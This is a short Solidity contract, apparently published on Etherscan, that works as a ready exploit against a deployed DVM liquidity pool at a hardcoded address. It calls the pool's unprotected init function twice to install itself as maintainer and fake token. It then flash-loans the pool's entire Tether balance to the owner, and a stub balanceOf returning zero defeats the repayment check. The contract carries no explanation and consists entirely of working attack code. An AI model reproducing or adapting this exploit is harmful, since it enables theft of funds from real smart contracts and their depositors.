/**
 *Submitted for verification at Etherscan.io on 2021-03-10
*/

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.7.0;

interface Tether {
    function transfer(address _to, uint _value) external;
    function balanceOf(address who) external returns (uint);
}

interface DVM {
    function init(address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) external;
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
    function sync() external;
}

contract Test {
    address private immutable owner;
    uint256 public decimals;

    constructor() payable {
        owner = msg.sender;
        decimals = 6;
    }

    function test() external {
        require(tx.origin == owner);
        address tether = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
        address dvm = 0x171f481fEa1042ed3Ee4470052e604FB4D91791A;

        DVM(dvm).init(address(this), address(this), dvm, 0, address(this), 1, 0, false);
        DVM(dvm).sync();
        DVM(dvm).init(address(this), tether, dvm, 0, address(this), 1, 0, false);
        DVM(dvm).flashLoan(Tether(tether).balanceOf(dvm), 0, owner, "");
    }

    function balanceOf(address /*who*/) external view returns (uint) {
        require(tx.origin == owner, "bad bot");
        return 0;
    }
}